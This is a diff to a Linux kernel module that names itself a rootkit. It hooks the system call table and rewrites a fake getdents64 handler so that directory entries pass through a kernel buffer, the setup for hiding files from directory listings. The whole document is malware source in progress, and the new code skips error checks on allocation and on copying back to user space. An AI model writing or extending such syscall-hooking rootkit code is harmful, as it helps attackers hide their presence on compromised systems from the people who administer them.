@@ -10,9 +10,11 @@
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/ptrace.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/syscalls.h>
+#include <linux/uaccess.h>
 #include <linux/version.h>
 
 static sys_call_ptr_t *sys_call_table_original;
@@ -59,9 +61,21 @@ static void unhook_all(void)
 
 int sys_getdents64_fake(struct pt_regs *regs)
 {
-    int count = sys_call_table_copy[__NR_getdents64](regs);
+    unsigned int fd = regs->di;
+    struct linux_dirent64 *dirent = regs->si;
+    unsigned int count = regs->dx;
 
-    return count;
+    struct linux_dirent64 *dirent_tmp = kmalloc(count, GFP_KERNEL);
+
+    regs->si = dirent_tmp;
+
+    int error = sys_call_table_copy[__NR_getdents64](regs);
+
+    copy_to_user(dirent, dirent_tmp, count);
+
+    kfree(dirent_tmp);
+
+    return error;
 }
 
 static int __init init_rootkit(void)
